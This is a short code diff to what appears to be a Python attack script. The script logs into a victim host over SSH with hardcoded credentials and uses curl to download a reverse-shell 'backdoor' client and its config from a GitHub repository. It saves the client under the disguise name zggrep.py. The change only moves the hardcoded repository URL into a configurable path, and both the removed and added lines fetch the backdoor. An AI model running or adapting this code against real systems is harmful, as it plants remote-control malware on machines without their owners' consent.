@@ -5,8 +5,7 @@ hostname = config.VICTIM_IP
 port = 22
 username = "user"
 password = "hill"
-backdoor_path = config.BACKDOOR_PATH
-listener_path = config.LISTENER_PATH
+repo_path = config.REPO_PATH
 
 def run_command(cmd, timeout=30):
     """Run a command and return (success, output)."""
@@ -65,7 +64,8 @@ try:
     time.sleep(1)
     
     # get backdoor
-    shell.send(b"curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py\n")
+    backdoor_link = f"{repo_path}/main/client.py\n"
+    shell.send((f"curl -o zggrep.py {backdoor_link}").encode())
     print("Downloading backdoor...")
     time.sleep(1)
     output = ""
@@ -74,7 +74,8 @@ try:
     print(output)
     
     # get config
-    shell.send(b"curl -O https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/config.py\n")
+    config_link = f"{repo_path}/main/config.py\n"
+    shell.send((f"curl -O {config_link}").encode())
     print("Downloading config file...")
     time.sleep(1)
     output = ""
